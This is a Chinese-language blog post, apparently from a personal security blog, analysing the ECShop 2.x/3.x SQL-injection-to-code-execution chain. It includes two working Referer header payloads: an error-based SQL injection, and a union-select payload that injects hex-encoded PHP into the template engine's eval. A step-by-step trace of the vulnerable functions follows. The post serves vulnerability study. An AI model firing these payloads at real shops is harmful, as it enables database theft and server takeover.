@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="存在漏洞版本12Ecshop 2.xEcshop 3.x-3.6.0 sql注入1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&amp;quot;num&amp;quot;;s:72:&amp;quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&amp;">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ecshop2.7.3漏洞分析">
+<meta property="og:url" content="https://cws6.github.io/2019/04/09/ecshop2-7-3漏洞分析/index.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="存在漏洞版本12Ecshop 2.xEcshop 3.x-3.6.0 sql注入1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&amp;quot;num&amp;quot;;s:72:&amp;quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&amp;">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-e8bc8fc704750427.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-284f0686e2f9d983.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-2dc25eef0f0ef8c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-c5850e14340c987b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-284b1439b26ac1b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-213425e5c17004f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-8d55373f7e804823.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-0976fab3506d6377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7ea60b021b6bcb2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-2308165c64d33d86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-9fd35f484cf04be5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-2dad763347e1749f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-d8183544e9787c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-b0640e77638950e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-4a35a745d93cf121.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-0d9c000b8a781f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/5035860-7e525dd22d4e1cb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-04-09T11:40:46.131Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ecshop2.7.3漏洞分析">
+<meta name="twitter:description" content="存在漏洞版本12Ecshop 2.xEcshop 3.x-3.6.0 sql注入1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&amp;quot;num&amp;quot;;s:72:&amp;quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&amp;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/5035860-e8bc8fc704750427.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/2019/04/09/ecshop2-7-3漏洞分析/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ecshop2.7.3漏洞分析 | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://cws6.github.io/2019/04/09/ecshop2-7-3漏洞分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cws6">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cws6">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ecshop2.7.3漏洞分析
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-09 19:28:49 / Modified: 19:40:46" itemprop="dateCreated datePublished" datetime="2019-04-09T19:28:49+08:00">2019-04-09</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h4 id="存在漏洞版本"><a href="#存在漏洞版本" class="headerlink" title="存在漏洞版本"></a>存在漏洞版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ecshop 2.x</span><br><span class="line">Ecshop 3.x-3.6.0</span><br></pre></td></tr></table></figure>
+<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-e8bc8fc704750427.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h4 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-284f0686e2f9d983.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p><code>user.php</code>文件中<code>display()</code>函数的模板变量可控，从而造成SQL注入漏洞，而后又通过SQL注入漏洞将恶意代码注入到危险函数<code>eval</code>中，从而实现了任意代码执行。</p>
+<h5 id="sql注入漏洞分析"><a href="#sql注入漏洞分析" class="headerlink" title="sql注入漏洞分析"></a>sql注入漏洞分析</h5><ul>
+<li>漏洞起源点在<code>user.php</code>中，可以看到<code>HTTP_REFERER</code>是可控的<br><img src="https://upload-images.jianshu.io/upload_images/5035860-2dc25eef0f0ef8c1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>跟进<code>assign()</code>，<code>assign()</code>把 <code>$back_act</code>赋值给模版变量 <code>back_act</code>。也就是<code>$back_act</code>变成了<code>$this-&gt;_var[$back_act]=$back_act</code>，而后调用<code>display()</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-c5850e14340c987b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>跟进<code>display()</code>，其中传进去的<code>user_passport.dwt</code>有一段为<br><img src="https://upload-images.jianshu.io/upload_images/5035860-284b1439b26ac1b0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/5035860-213425e5c17004f6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>首先会调用<code>$this-&gt;fetch</code> 来处理 <code>user_passport.dwt</code> 模板文件，<code>fetch()</code>中用 <code>$this-&gt;make_compiled</code>来编译模板，<code>make_compiled</code>会将模板中的变量解析，将上面<code>assign</code>的变量 <code>$back_act</code>传递进去了，解析完变量之后返回到<code>display()</code>中。此时<code>$out</code>是解析变量后的<code>html</code>内容，然后判断 <code>$this-&gt;_echash</code> 是否在 <code>$out</code>中，如果存在的话，使用 <code>$this-&gt;_echash</code>来分割内容，得到<code>$k</code>然后交给<code>insert_mod</code>处理，其中<code>_echash</code> 的值为<br><img src="https://upload-images.jianshu.io/upload_images/5035860-8d55373f7e804823.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li><code>_echash</code>是默认值，所以<code>$val</code>内容可随意控制。跟进<code>$this-&gt;insert_mod</code>：<br><img src="https://upload-images.jianshu.io/upload_images/5035860-0976fab3506d6377.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li><code>$val</code>传递进来，先用<code>|</code>分割，得到<code>$fun</code>和<code>$para</code>，<code>$para</code>进行反序列操作，<code>$fun</code> 和<code>insert_</code>拼接，最后动态调用<code>fun(para)</code>，函数名部分可控，参数完全可控。在 <code>/includes/lib_insert.php</code> 有一个 <code>insert_ads()</code> ，其中<code>$arr</code> 是可控的，并且 <code>$arr[&#39;id&#39;]</code> 和 <code>$arr[&#39;num&#39;]</code>会拼接到SQL语句中<br><img src="https://upload-images.jianshu.io/upload_images/5035860-7ea60b021b6bcb2f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>那么就可以构造出如下的payload<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echash+fun|serialize(array(&quot;num&quot;=&gt;sqlpayload,&quot;id&quot;=&gt;1))</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echash:554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line">fun:ads</span><br><span class="line">反序列化数据：</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [num] =&gt; 0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -</span><br><span class="line">    [id] =&gt; 1</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<h5 id="代码执行漏洞分析"><a href="#代码执行漏洞分析" class="headerlink" title="代码执行漏洞分析"></a>代码执行漏洞分析</h5><ul>
+<li>继续查看<code>insert_ads()</code>，在SQL查询结束之后会调用<code>fetch()</code>，在此处传入的参数是<code>$position_style</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-2308165c64d33d86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li><code>$position_style</code>的值是<code>$row[&#39;position_style&#39;]</code>，SQL查询的结果可控，也就是<code>$position_style</code>可控。但是需要<code>$row[&#39;position_id&#39;]=$arr[&#39;id&#39;]</code>，查询结果可控，<code>arr[&#39;id&#39;]</code>同样可控<br><img src="https://upload-images.jianshu.io/upload_images/5035860-9fd35f484cf04be5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>其中<code>$position_style</code>传入的时候会与<code>str:</code>进行拼接，进入<code>fetch()</code>，这个地方调用危险函数<code>$this-&gt;_eval</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-2dad763347e1749f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li><p>跟进<code>fetch_str()</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-d8183544e9787c9f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><code>preg_replace(&quot;/{([^\}\{\n]*)}/e&quot;, &quot;\$this-&gt;select(&#39;\\1&#39;);&quot;, $source);</code>，这个正则表达式是匹配<code>{}</code>中的内容。<br><img src="https://upload-images.jianshu.io/upload_images/5035860-b0640e77638950e3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li><p>跟进<code>select()</code>，当传入的变量的第一个字符是<code>$</code>，会返回由 php 标签包含变量的字符串，最终返回到<code>_eval()</code>危险函数内。<br><img src="https://upload-images.jianshu.io/upload_images/5035860-4a35a745d93cf121.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+</li>
+<li>跟进<code>get_var()</code><br><img src="https://upload-images.jianshu.io/upload_images/5035860-0d9c000b8a781f2e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>当传入的变量没有<code>.$</code>时，调用<code>$this-&gt;make_var</code>，跟进<code>make_var</code>：<br><img src="https://upload-images.jianshu.io/upload_images/5035860-7e525dd22d4e1cb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>结合<code>select()</code>里面的语句来看，<code>$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]</code>，要成功执行代码的话，<code>$val</code>必须要把<code>[&#39;</code>闭合，所以payload构造，从下往上构造，<code>$val</code>为<code>abc&#39;];echo phpinfo();//</code>；从<code>select()</code>进入<code>get_var</code>的条件是第一个字符是<code>$</code>，所以payload变成了<code>$abc&#39;];echo phpinfo();//</code>；而要进入到<code>select()</code>，需要被捕获，payload变成了<code>{$abc&#39;];echo phpinfo();//}</code>，这里因为payload的是<code>phpinfo()</code>，这里会被fetch_str函数的第一个正则匹配到，需要变换一下，所以payload变为<code>{$abc&#39;];echo phpinfo/**/();//}</code>。</li>
+<li>然后把构造好的代码通过SQL注入漏洞传给<code>$position_style</code>。 这里可以用<code>union select</code>来控制查询的结果，根据之前的流程，<code>$row[&#39;position_id&#39;]</code>和<code>$arr[&#39;id&#39;]</code>要相等，<code>$row[&#39;position_id&#39;]</code>是第二列的结果，<code>$position_style</code>是第九列的结果。<code>$arr[&#39;id&#39;]</code>传入<code>&#39; /*</code>，<code>$arr[&#39;num&#39;]</code>传入<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>，<code>0x27202f2a</code>是<code>&#39; /*</code>的16进制值，也就是<code>$row[&#39;position_id&#39;]</code>的值，<code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>是上面构造的php代码的16进制值，也就是<code>$position_style</code>。</li>
+</ul>
+<hr>
+<p>参考文献：<a href="https://www.cnblogs.com/bmjoker/p/9953451.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/9953451.html</a><br><a href="https://paper.seebug.org/695" target="_blank" rel="noopener">https://paper.seebug.org/695</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+    <div>
+    
+       <div>
+
+    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+
+</div>
+    
+    </div>
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/24/phpcms2008远程代码执行漏洞/" rel="next" title="phpcms2008远程代码执行漏洞">
+                <i class="fa fa-chevron-left"></i> phpcms2008远程代码执行漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">88</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://r1ka.me" title="http://r1ka.me" rel="noopener" target="_blank">r1ka</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blank233.github.io/" title="https://blank233.github.io/" rel="noopener" target="_blank">Blank</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.lrestless.com/" title="http://blog.lrestless.com/" rel="noopener" target="_blank">lrestless</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wcute.github.io" title="https://wcute.github.io" rel="noopener" target="_blank">鸡翅儿</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/xiaoqiyue/" title="https://www.cnblogs.com/xiaoqiyue/" rel="noopener" target="_blank">爪爪</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#存在漏洞版本"><span class="nav-number">1.</span> <span class="nav-text">存在漏洞版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sql注入"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#代码执行"><span class="nav-number">3.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞成因"><span class="nav-number">4.</span> <span class="nav-text">漏洞成因</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#sql注入漏洞分析"><span class="nav-number">4.1.</span> <span class="nav-text">sql注入漏洞分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#代码执行漏洞分析"><span class="nav-number">4.2.</span> <span class="nav-text">代码执行漏洞分析</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
